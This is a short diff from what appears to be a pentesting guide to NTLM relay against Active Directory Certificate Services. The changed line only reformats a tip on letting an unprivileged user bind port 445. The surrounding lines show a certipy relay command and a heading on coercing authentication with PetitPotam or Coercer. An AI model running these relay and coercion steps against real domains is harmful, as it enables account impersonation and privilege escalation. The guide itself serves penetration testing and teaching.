@@ -18,7 +18,7 @@ certipy relay \
 certipy relay -target 'https://<IP_ADDRESS>'
 ```
 
-## Tip: If you get a 'permission denied' while trying to listen on port 445, you can use the command (on Linux): 'echo 0 | sudo tee /proc/sys/net/ipv4/ip_unprivileged_port_start'
+## Tip: If you get a 'permission denied' while trying to listen on port 445, you can use the command (on Linux): `echo 0 | sudo tee /proc/sys/net/ipv4/ip_unprivileged_port_start`
 
 ## 3. Coerce Authentication with other tool (Petitpotam, Coercer)
 
